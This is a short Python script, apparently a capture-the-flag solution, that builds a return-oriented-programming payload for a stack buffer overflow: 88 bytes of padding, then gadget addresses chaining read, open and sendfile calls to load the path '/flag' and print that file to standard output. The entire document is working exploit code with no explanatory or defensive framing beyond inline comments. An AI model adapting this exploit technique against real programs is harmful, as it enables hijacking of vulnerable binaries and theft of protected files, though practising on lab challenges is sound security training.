#!/usr/bin/env python3

from struct import pack

payload = b'a' * 88

# 0x404040 is the address of a global variable.
# read(0, 0x405090, 5);
payload += pack("<Q", 0x401eeb) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401ed3) # pop rsi ; ret
payload += pack("<Q", 0x405090) # data
payload += pack("<Q", 0x401edb) # pop rdx ; ret
payload += pack("<Q", 5)        # data
payload += pack("<Q", 0x401150) # <read@plt>

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x401eeb) # pop rdi ; ret
payload += pack("<Q", 0x405090) # data
payload += pack("<Q", 0x401ed3) # pop rsi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x4011b0) # <open@plt>

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x401eeb) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x401ed3) # pop rsi ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x401edb) # pop rdx ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401ee3) # pop rcx ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", 0x401190) # <sendfile@plt>

with open("payload", "wb") as f:
    f.write(payload)
